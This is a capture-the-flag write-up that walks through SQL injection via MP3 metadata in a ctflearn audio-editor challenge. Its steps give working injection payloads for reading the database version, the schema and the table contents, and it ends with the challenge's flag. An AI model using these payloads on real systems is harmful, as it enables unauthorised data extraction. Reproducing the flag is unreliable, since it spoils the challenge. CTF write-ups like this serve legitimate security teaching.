This challenge is a classic example of a **SQL Injection (SQLi)** vulnerability, specifically within an MP3 metadata editor. The goal is to exploit the web application's input fields to extract information and ultimately find the flag.

## Step 1: Analyzing the Application

The challenge is a web application located at `http://web.ctflearn.com/audioedit/`. The application appears to allow users to edit MP3 file metadata. From a hint, we learn that a user's MP3 file is being processed, and its metadata (`author` and `title`) is being inserted into a database.

The SQL `INSERT` statement likely looks something like this:

`INSERT INTO audioedit (..., author, title, ...) VALUES (..., '[author_input]', '[title_input]', ...);`

Our goal is to manipulate the `author` and `title` fields to execute our own SQL queries.

## Step 2: Injecting the SQL Query

We need to create a crafted MP3 file to inject our malicious query. We can use a tool like `easyTAG` to modify the metadata fields. The injection must be carefully crafted to break out of the string literal and execute a new query, while still maintaining valid SQL syntax.

The challenge states that the first and last characters of our input are truncated, which is a crucial detail. The provided hint is a good starting point.

- **Author Field:** `a', (SELECT @@version))-- -b`
- **Title Field:** `""` (empty)

The resulting SQL statement becomes:

`INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);`

The single quote `'` in our input closes the first string literal. The `(SELECT @@version)` is our payload, which will retrieve the database version. The `-- -b` comments out the rest of the original query, preventing a syntax error.

By submitting this, we discover the database version: `5.5.49-0ubuntu0.14.04.1`.

## Step 3: Extracting Database Information

Now that we know we can inject, we can use a similar process to find the database name, column names, and finally, the flag.

### A. Finding the Database Name

- **Author Field:** `a', (SELECT database()))-- -b`

This query returns the name of the current database: `audioedit`.

### B. Finding the Column Names

To find the column names, we query the `information_schema.columns` table, which holds metadata about all tables in the database.

- **Author Field:** `a',(SELECT column_name FROM information_schema.columns WHERE table_name = 'audioedit' LIMIT x,1))-- -a`

We can iterate through the values of `x` from `0` to `3` to find the column names:

- `x=0`: `id`
- `x=1`: `file`
- `x=2`: `author`
- `x=3`: `title`

### C. Extracting the Flag

After trying to select from the `audioedit` table, we get an insertion error. This is a common defense mechanism in SQL, as you cannot read from a table that you are currently writing to in the same statement.

The solution is to use a table alias, a trick to bypass this restriction.

- **Author Field:** `a',(SELECT author FROM audioedit.audioedit as blub LIMIT 0,1))-- -a`
- **Result:** `ABCTF`
- **Author Field:** `a',(SELECT title FROM audioedit.audioedit as blub LIMIT 0,1))-- -a`
- **Result:** `flag`
- **Author Field:** `a',(SELECT file FROM audioedit.audioedit as blub LIMIT 0,1))-- -a`
- **Result:** `supersecretflagf1le.mp3`

The flag is located in a file named `supersecretflagf1le.mp3`.

## Step 4: Final Exploitation

Now that we have the name of the flag file, we can simply construct a URL to access it. The application likely has a separate script to serve the files, often with a `GET` parameter.

The final exploited URL is: `https://web.ctflearn.com/audioedit/edit.php?file=supersecretflagf1le.mp3`

Visiting this URL reveals the file and the flag within.

## Step 5: The Flag

The flag is:

**`ABCTF{m3t4_inj3cti00n}`**
